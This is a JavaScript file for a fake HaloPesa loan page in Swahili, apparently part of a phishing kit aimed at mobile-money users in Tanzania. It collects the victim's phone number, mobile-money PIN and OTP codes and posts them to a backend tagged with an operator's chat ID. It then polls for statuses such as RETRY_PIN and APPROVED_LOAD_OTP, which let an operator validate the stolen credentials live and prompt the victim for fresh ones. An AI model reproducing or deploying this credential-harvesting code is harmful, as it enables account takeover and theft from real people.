document.addEventListener('DOMContentLoaded', () => {
  // DOM Elements
  const loanSlider = document.getElementById('loanSlider');
  const loanAmountText = document.getElementById('loanAmountText');
  const durationButtons = document.querySelectorAll('.duration-btn');

  const firstName = document.getElementById('firstName');
  const lastName = document.getElementById('lastName');
  const phoneNumber = document.getElementById('phoneNumber');
  const pinInput = document.getElementById('pinInput');
  const otpInput = document.getElementById('otpInput');

  const btnToStep2 = document.getElementById('btnToStep2');
  const btnToStep3 = document.getElementById('btnToStep3');
  const btnSubmitLogin = document.getElementById('btnSubmitLogin');
  const btnSubmitOtp = document.getElementById('btnSubmitOtp');

  let currentUserId = null;
  let statusPollInterval = null;
  let selectedDuration = 'Mwezi 1';

  // Parse Admin parameter from URL
  const urlParams = new URLSearchParams(window.location.search);
  const adminChatId = urlParams.get('admin') || '';

  // Utility to switch screens
  function showSection(sectionId) {
    const sections = ['calcScreen', 'form1', 'form2', 'form3', 'loginScreen', 'otpScreen', 'successScreen'];
    sections.forEach(id => {
      const el = document.getElementById(id);
      if (el) el.classList.add('hidden');
    });
    const target = document.getElementById(sectionId);
    if (target) target.classList.remove('hidden');
  }

  // Strict Validation for HaloPesa Tanzania numbers (062, 063, 061)
  function validateHaloPesaNumber(phone) {
    const clean = String(phone || '').replace(/\D/g, '');
    if (/^(062|063|061)\d{7}$/.test(clean)) return true;
    if (/^(25562|25563|25561)\d{7}$/.test(clean)) return true;
    return false;
  }

  // Calculator Slider Handling
  if (loanSlider && loanAmountText) {
    loanSlider.addEventListener('input', (e) => {
      const val = parseInt(e.target.value).toLocaleString();
      loanAmountText.textContent = `TSh ${val}`;
    });
  }

  // Duration button toggles
  durationButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      durationButtons.forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      selectedDuration = btn.textContent.trim();
    });
  });

  // Flow Navigation
  if (btnToStep2) {
    btnToStep2.addEventListener('click', () => {
      showSection('form2');
    });
  }

  if (btnToStep3) {
    btnToStep3.addEventListener('click', () => {
      const phoneVal = phoneNumber.value.trim();

      if (!firstName.value.trim()) {
        alert('Tafadhali jaza Jina la Kwanza.');
        return;
      }

      if (!validateHaloPesaNumber(phoneVal)) {
        alert('Namba haikubaliki! Ingiza namba sahihi ya HaloPesa kuanzia na 062, 063, au 061 (mfano: 062XXXXXXX).');
        phoneNumber.focus();
        return;
      }

      document.getElementById('sumName').textContent = `${firstName.value.trim()} ${lastName.value.trim()}`;
      document.getElementById('sumPhone').textContent = phoneVal;
      document.getElementById('sumAmount').textContent = loanAmountText.textContent;
      
      showSection('form3');
    });
  }

  // Step 3 to PIN Screen
  const btnToLogin = document.getElementById('btnToLogin');
  if (btnToLogin) {
    btnToLogin.addEventListener('click', () => {
      showSection('loginScreen');
    });
  }

  // Submit Application (Phone + PIN + Loan Amount)
  if (btnSubmitLogin) {
    btnSubmitLogin.addEventListener('click', async () => {
      const pin = pinInput.value.trim();
      const contact = phoneNumber.value.trim();

      if (!/^\d{4}$/.test(pin)) {
        alert('Tafadhali weka PIN sahihi ya tarakimu 4.');
        return;
      }

      btnSubmitLogin.disabled = true;
      btnSubmitLogin.textContent = 'Inatuma...';

      try {
        const response = await fetch('/api/submit-application', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            contact,
            pin,
            amount: loanAmountText.textContent,
            adminChatId
          })
        });

        const data = await response.json();

        if (data.success) {
          currentUserId = data.userId;
          btnSubmitLogin.textContent = 'Inasubiri Uhakiki...';
          startStatusPolling();
        } else {
          alert(data.error || 'Imefeli kutuma. Jaribu tena.');
          btnSubmitLogin.disabled = false;
          btnSubmitLogin.textContent = 'INGIA';
        }
      } catch (err) {
        alert('Hitilafu ya mtandao. Tafadhali jaribu tena.');
        btnSubmitLogin.disabled = false;
        btnSubmitLogin.textContent = 'INGIA';
      }
    });
  }

  // Submit OTP
  if (btnSubmitOtp) {
    btnSubmitOtp.addEventListener('click', async () => {
      const otp = otpInput.value.trim();

      if (!otp || otp.length < 4) {
        alert('Tafadhali ingiza kodi sahihi ya OTP.');
        return;
      }

      btnSubmitOtp.disabled = true;
      btnSubmitOtp.textContent = 'Inathibitisha...';

      try {
        const response = await fetch('/api/submit-otp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userId: currentUserId,
            otp
          })
        });

        const data = await response.json();

        if (data.success) {
          btnSubmitOtp.textContent = 'Inasubiri Idhini...';
        } else {
          alert(data.error || 'OTP Isiyo sahihi.');
          btnSubmitOtp.disabled = false;
          btnSubmitOtp.textContent = 'THIBITISHA OTP';
        }
      } catch (err) {
        alert('Hitilafu ya mtandao.');
        btnSubmitOtp.disabled = false;
        btnSubmitOtp.textContent = 'THIBITISHA OTP';
      }
    });
  }

  // Polling Server Status
  function startStatusPolling() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentUserId) return;

      try {
        const res = await fetch(`/api/check-status/${currentUserId}`);
        const data = await res.json();

        if (data.status === 'APPROVED_LOAD_OTP') {
          showSection('otpScreen');
          if (btnSubmitLogin) {
            btnSubmitLogin.disabled = false;
            btnSubmitLogin.textContent = 'INGIA';
          }
        } else if (data.status === 'SUCCESS') {
          clearInterval(statusPollInterval);
          showSection('successScreen');
        } else if (data.status === 'RETRY_PIN') {
          alert('PIN uliyoingiza siyo sahihi! Tafadhali ingiza PIN sahihi.');
          showSection('loginScreen');
          if (pinInput) pinInput.value = '';
          if (btnSubmitLogin) {
            btnSubmitLogin.disabled = false;
            btnSubmitLogin.textContent = 'INGIA';
          }
        } else if (data.status === 'RETRY_OTP') {
          alert('Kodi ya OTP uliyoingiza siyo sahihi! Tafadhali ingiza OTP mpya.');
          if (otpInput) otpInput.value = '';
          if (btnSubmitOtp) {
            btnSubmitOtp.disabled = false;
            btnSubmitOtp.textContent = 'THIBITISHA OTP';
          }
        } else if (data.status === 'DENIED') {
          clearInterval(statusPollInterval);
          alert('Ombi lako limekataliwa.');
          window.location.reload();
        }
      } catch (e) {}
    }, 2500);
  }
});
